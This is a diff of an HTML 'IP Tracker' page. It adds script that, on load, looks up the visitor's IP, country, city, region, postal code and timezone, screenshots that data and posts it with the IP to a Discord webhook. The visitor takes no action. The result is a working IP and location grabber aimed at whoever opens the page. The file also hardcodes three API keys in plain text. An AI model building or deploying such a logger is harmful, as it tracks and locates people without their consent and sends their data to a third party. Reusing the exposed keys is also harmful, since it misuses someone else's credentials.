@@ -1,74 +1,182 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>IP Tracker</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>IP Tracker — Auto Screenshot</title>
 <style>
-  body {
-    background-color: #000;
-    color: #fff;
-    font-family: Arial, sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
+  :root { --bg:#000; --card:#0f0f0f; --muted:#9aa0a6; --accent:#7c7cff; }
+  html,body{height:100%;margin:0}
+  body{
+    background:var(--bg);
+    color:#fff;
+    font-family: Inter, system-ui, Arial, sans-serif;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
   }
-  .container {
-    text-align: center;
-    background-color: #111;
-    padding: 30px;
-    border-radius: 12px;
-    box-shadow: 0 0 20px rgba(255,255,255,0.2);
+  .container{
+    width:min(720px,96%);
+    background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+    padding:26px;
+    border-radius:12px;
+    box-shadow:0 8px 28px rgba(0,0,0,0.7);
+    text-align:center;
   }
-  h1 { margin-bottom: 20px; }
+  h1{margin:0 0 10px;font-weight:600}
+  .desc{color:var(--muted);margin-bottom:14px;font-size:14px}
+  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px;margin-top:12px}
+  .card{background:#080808;padding:12px;border-radius:10px;text-align:left}
+  .card strong{display:block;font-size:18px;color:#fff}
+  .label{font-size:12px;color:var(--muted);margin-top:6px}
+  #status{margin-top:14px;color:var(--muted);font-size:13px}
+  .btn{margin-top:12px;padding:8px 12px;border-radius:8px;border:1px solid rgba(255,255,255,0.06);background:transparent;color:#fff;cursor:pointer}
+  footer{margin-top:14px;font-size:12px;color:var(--muted)}
+  code{background:#0b0b0b;padding:2px 6px;border-radius:6px}
 </style>
 </head>
 <body>
-<div class="container">
-  <h1>IP Information</h1>
-  <p><strong>IP Address:</strong> <span id="ip">Loading...</span></p>
-  <p><strong>Country:</strong> <span id="country">Loading...</span></p>
-  <p><strong>Approx Location:</strong> <span id="location">Loading...</span></p>
-  <p><strong>Timezone:</strong> <span id="timezone">Loading...</span></p>
-</div>
+  <div class="container" id="capture-root">
+    <h1>IP Information</h1>
+    <p class="desc">This page displays your IP, country and approximate address. It will automatically capture a screenshot of this page (only the page content) and send it to a Discord webhook.</p>
 
-<script>
-const ipEl = document.getElementById('ip');
-const countryEl = document.getElementById('country');
-const locationEl = document.getElementById('location');
-const timezoneEl = document.getElementById('timezone');
+    <div class="grid">
+      <div class="card">
+        <strong id="ip">Loading...</strong>
+        <div class="label">IP Address</div>
+      </div>
+      <div class="card">
+        <strong id="country">Loading...</strong>
+        <div class="label">Country</div>
+      </div>
+      <div class="card">
+        <strong id="avgAddress">Loading...</strong>
+        <div class="label">Avg Address (city, region, postal)</div>
+      </div>
+      <div class="card">
+        <strong id="timezone">Loading...</strong>
+        <div class="label">Timezone</div>
+      </div>
+    </div>
 
-const IP_API_KEY = "c0b65d33232a4f038c6e02622cd04f99";
-const GEO_API_KEY = "70f4d8c5dc604942a9f08a8f26261856";
-const TZ_API_KEY = "4b975310867d44458fa5d6822ebfeb5e";
+    <div id="status">Preparing…</div>
+    <button class="btn" id="resendBtn">Resend screenshot</button>
 
-async function fetchIPInfo() {
-  try {
-    // 1. IP Intelligence API
-    const ipRes = await fetch(`https://ipgeolocation.abstractapi.com/v1/?api_key=${GEO_API_KEY}`);
-    const ipData = await ipRes.json();
+    <footer>Replace <code>DISCORD_WEBHOOK_URL</code> in the script with your webhook. Uses Abstract APIs for geolocation & timezone.</footer>
+  </div>
 
-    ipEl.textContent = ipData.ip_address || "N/A";
-    countryEl.textContent = ipData.country || "N/A";
-    locationEl.textContent = `${ipData.city || ""}, ${ipData.region || ""}` || "N/A";
+  <!-- html2canvas -->
+  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
 
-    // 2. Timezone API
-    const tzRes = await fetch(`https://timezone.abstractapi.com/v1/current_time/?api_key=${TZ_API_KEY}&location=${ipData.city}`);
-    const tzData = await tzRes.json();
-    timezoneEl.textContent = tzData.timezone_location || "N/A";
+  <script>
+  // -------------------- CONFIG --------------------
+  // Keys you provided earlier:
+  const IP_INTELLIGENCE_KEY = "c0b65d33232a4f038c6e02622cd04f99"; // (not used separately here, kept for reference)
+  const GEO_API_KEY = "70f4d8c5dc604942a9f08a8f26261856";
+  const TZ_API_KEY  = "4b975310867d44458fa5d6822ebfeb5e";
 
-  } catch (err) {
-    ipEl.textContent = "Error";
-    countryEl.textContent = "Error";
-    locationEl.textContent = "Error";
-    timezoneEl.textContent = "Error";
-    console.error(err);
+  // <-- REPLACE this with your actual Discord webhook URL -->
+  const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL";
+
+  // -------------------- UI --------------------
+  const ipEl = document.getElementById('ip');
+  const countryEl = document.getElementById('country');
+  const avgAddressEl = document.getElementById('avgAddress');
+  const timezoneEl = document.getElementById('timezone');
+  const statusEl = document.getElementById('status');
+  const resendBtn = document.getElementById('resendBtn');
+  const captureRoot = document.getElementById('capture-root');
+
+  // safe default text
+  const safe = v => (v === undefined || v === null || v === '') ? 'N/A' : v;
+
+  // fetch IP/geolocation from Abstract
+  async function fetchGeo() {
+    statusEl.textContent = 'Fetching geolocation data...';
+    try {
+      // Abstract IP Geolocation endpoint (works in-browser if CORS + plan allow)
+      const geoResp = await fetch(`https://ipgeolocation.abstractapi.com/v1/?api_key=${GEO_API_KEY}`);
+      if (!geoResp.ok) throw new Error('Geo fetch failed: ' + geoResp.status);
+      const geo = await geoResp.json();
+
+      // Fill UI
+      ipEl.textContent = safe(geo.ip_address);
+      countryEl.textContent = safe(geo.country);
+      const avgAddress = `${safe(geo.city)}${geo.city ? ', ' : ''}${safe(geo.region)}${geo.postal_code ? ', ' + geo.postal_code : ''}`;
+      avgAddressEl.textContent = avgAddress === 'N/A, N/A' ? safe(geo.ip_address) : avgAddress;
+
+      // Timezone call (use city if present, else ip)
+      const tzLoc = geo.city || geo.ip_address;
+      const tzResp = await fetch(`https://timezone.abstractapi.com/v1/current_time/?api_key=${TZ_API_KEY}&location=${encodeURIComponent(tzLoc)}`);
+      const tz = await tzResp.json();
+      timezoneEl.textContent = safe(tz.timezone_location || tz.utc_offset || tz.abbreviation);
+
+      statusEl.textContent = 'Data loaded. Taking screenshot shortly...';
+
+      // small delay so UI fully paints
+      await new Promise(r => setTimeout(r, 700));
+      await captureAndSend();
+
+    } catch (err) {
+      console.error(err);
+      statusEl.textContent = 'Error fetching data — check console.';
+      ipEl.textContent = countryEl.textContent = avgAddressEl.textContent = timezoneEl.textContent = 'Error';
+    }
   }
-}
 
-fetchIPInfo();
-</script>
+  // capture the #capture-root element and send to Discord webhook
+  async function captureAndSend() {
+    statusEl.textContent = 'Capturing page screenshot...';
+    try {
+      const canvas = await html2canvas(captureRoot, { useCORS: true, scale: 1.2 });
+      const dataUrl = canvas.toDataURL('image/png');
+      const res = await fetch(dataUrl);
+      const blob = await res.blob();
+
+      // prepare multipart form
+      const form = new FormData();
+      form.append('file', blob, 'page-screenshot.png');
+
+      // add content text with IP & country for quick reference
+      const contentText = `Page screenshot — IP: ${ipEl.textContent} — Country: ${countryEl.textContent} — ${new Date().toLocaleString()}`;
+      form.append('content', contentText);
+
+      statusEl.textContent = 'Sending screenshot to webhook...';
+
+      // send to webhook
+      const sendResp = await fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        body: form
+      });
+
+      if (sendResp.ok) {
+        statusEl.textContent = 'Screenshot sent successfully ✅';
+      } else {
+        // may fail due to CORS — show details in console
+        const t = await sendResp.text().catch(()=> '');
+        console.warn('Webhook error', sendResp.status, t);
+        statusEl.textContent = `Webhook returned ${sendResp.status} — check console (possible CORS).`;
+      }
+
+    } catch (err) {
+      console.error('capture/send error:', err);
+      // If error is a CORS/network blocked, give user guidance
+      statusEl.textContent = 'Failed to send screenshot (see console). If you see CORS errors, use the simple proxy described below.';
+    }
+  }
+
+  // manual resend button
+  resendBtn.addEventListener('click', async () => {
+    statusEl.textContent = 'Manual resend requested...';
+    await captureAndSend();
+  });
+
+  // kick off on load
+  (async () => {
+    await new Promise(r => setTimeout(r, 200));
+    fetchGeo();
+  })();
+  </script>
 </body>
 </html>
